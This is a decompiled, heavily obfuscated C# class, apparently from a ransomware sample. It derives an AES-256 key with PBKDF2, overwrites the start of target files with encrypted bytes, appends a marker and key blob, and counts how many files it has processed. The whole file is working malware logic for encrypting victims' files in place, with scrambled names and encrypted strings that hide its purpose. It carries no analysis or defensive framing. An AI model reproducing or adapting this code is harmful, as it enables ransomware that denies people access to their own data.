using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

public static class fkozHCDTDrY
{
	[NonSerialized]
	internal static GetString _001D;

	public static byte[] GVHcoGquozRzL(byte[] P_0, byte[] P_1, byte[] P_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = XPUhWjxaPSvB(P_1, P_2);
		P_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(P_0, 0, P_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes XPUhWjxaPSvB(byte[] P_0, byte[] P_1)
	{
		return new Rfc2898DeriveBytes(P_0, P_1, 52768);
	}

	public static byte[] OlBXyEPnCYpDO(string P_0, int P_1)
	{
		byte[] array = new byte[P_1];
		try
		{
			if (PFruJiQrcriiZ.POXokwFKrkkHxdVH == _001D(107396903))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(P_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, P_1);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(P_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, P_1);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (PFruJiQrcriiZ.joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(PFruJiQrcriiZ.jnRLNtXuRRg, _001D(107386548) + P_0 + _001D(107401313) + ex.Message + _001D(107396336));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(P_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, P_1);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool wXhdORmUgbGuB(string ZsIFKCtaED, byte[] quwoLGzcjeGYg, byte[] TTsauZziAEbN = null)
	{
		try
		{
			byte[] array = null;
			if (PFruJiQrcriiZ.POXokwFKrkkHxdVH == _001D(107396903))
			{
				array = (PFruJiQrcriiZ.IooTTsvIiwCN ? Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_001D(107401255)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_001D(107401255))) : Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_001D(107401296)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_001D(107401296))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(ZsIFKCtaED, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(quwoLGzcjeGYg, 0, quwoLGzcjeGYg.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(ZsIFKCtaED, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!PFruJiQrcriiZ.IooTTsvIiwCN)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(TTsauZziAEbN, 0, TTsauZziAEbN.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (PFruJiQrcriiZ.IooTTsvIiwCN ? Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_001D(107401255)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_001D(107401255))) : Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_001D(107401296)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_001D(107401296))));
				FileStream fileStream2 = new FileStream(ZsIFKCtaED, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(quwoLGzcjeGYg, 0, quwoLGzcjeGYg.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(ZsIFKCtaED, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!PFruJiQrcriiZ.IooTTsvIiwCN)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(TTsauZziAEbN, 0, TTsauZziAEbN.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			PFruJiQrcriiZ.XnicJWCgBOO++;
		}
		catch (Exception ex)
		{
			if (PFruJiQrcriiZ.joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(PFruJiQrcriiZ.jnRLNtXuRRg, _001D(107386548) + ZsIFKCtaED + _001D(107401246) + ex.Message + _001D(107396336));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (PFruJiQrcriiZ.IooTTsvIiwCN ? Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_001D(107401255)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_001D(107401255))) : Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_001D(107401296)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(_001D(107401296))));
				FileStream fileStream4 = new FileStream(ZsIFKCtaED, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(quwoLGzcjeGYg, 0, quwoLGzcjeGYg.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(ZsIFKCtaED, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!PFruJiQrcriiZ.IooTTsvIiwCN)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(TTsauZziAEbN, 0, TTsauZziAEbN.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static fkozHCDTDrY()
	{
		Strings.CreateGetStringDelegate(typeof(fkozHCDTDrY));
	}
}
